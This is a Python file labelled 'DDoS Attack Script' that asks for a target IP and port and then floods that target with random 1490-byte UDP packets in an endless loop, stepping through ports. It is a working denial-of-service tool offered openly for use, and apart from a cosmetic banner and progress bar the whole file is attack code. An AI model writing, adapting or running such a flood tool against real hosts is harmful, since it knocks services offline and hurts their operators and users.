import sys
import os
import time
import socket
import random
from datetime import datetime

# Function to clear screen
def clear_screen():
    os.system("clear" if os.name == "posix" else "cls")

# Function to print header
def print_header():
    clear_screen()
    print("╔════════════════════════════════════════════════════════════════════════════════════════╗")
    print("║    DDoS Attack Script                                                                  ║")
    print("║    Author: Raj                                                                         ║")
    print("║    GitHub: https://github.com/BhatiaRaj/DDoS---Distributed-Denial-of-Service.git       ║")
    print("╚════════════════════════════════════════════════════════════════════════════════════════╝")

# Function to perform DDoS attack
def perform_ddos(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1490)
    sent = 0
    try:
        while True:
            sock.sendto(bytes, (ip, port))
            sent += 1
            port += 1
            print(f"Sent {sent} packet to {ip} through port: {port}")
            if port == 65534:
                port = 1
    except KeyboardInterrupt:
        print("\nDDoS attack stopped.")
    except Exception as e:
        print(f"An error occurred: {e}")

# Main function
def main():
    print_header()
    ip = input("Enter target IP: ")
    port = int(input("Enter target port: "))
    print_header()
    print("Attack starting...")
    print(" [                    ] 0% ")
    for i in range(1, 6):
        time.sleep(1)
        print(f" [{'=' * (i * 5)}{' ' * ((5 - i) * 5)}] {i * 25}%")
    perform_ddos(ip, port)

if __name__ == "__main__":
    main()
